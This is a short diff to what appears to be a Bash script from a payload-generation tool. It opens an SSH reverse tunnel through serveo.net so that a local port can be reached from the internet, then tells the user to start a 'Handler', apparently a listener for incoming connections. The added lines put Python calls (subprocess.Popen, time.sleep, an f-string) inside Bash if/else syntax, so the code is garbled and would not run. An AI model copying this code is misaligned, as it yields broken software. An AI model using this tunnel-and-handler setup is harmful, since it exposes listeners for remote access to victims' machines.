@@ -38,8 +38,10 @@ done
 clear && printf "Generated!!" | lolcat
 ssh -o "StrictHostKeyChecking=accept-new" -p 8022 -R $port:localhost:$port serveo.net
 clear
-printf "\033[1;31m[-] Port is in use\033[0m\n"
-printf "\033[1;31m[-] Please try again later\033[0m\n"
+subprocess.Popen(["ssh", "-o", "StrictHostKeyChecking=accept-new", "-R", f"{port}:localhost:{port}", "serveo.net"])
+time.sleep(7)
+
+printf("\n\n\nOpen a new session and give command : 'sh Handler'")
 else
 printf "\033[1;31m[-] Exiting..\033[0m\n"
 fi
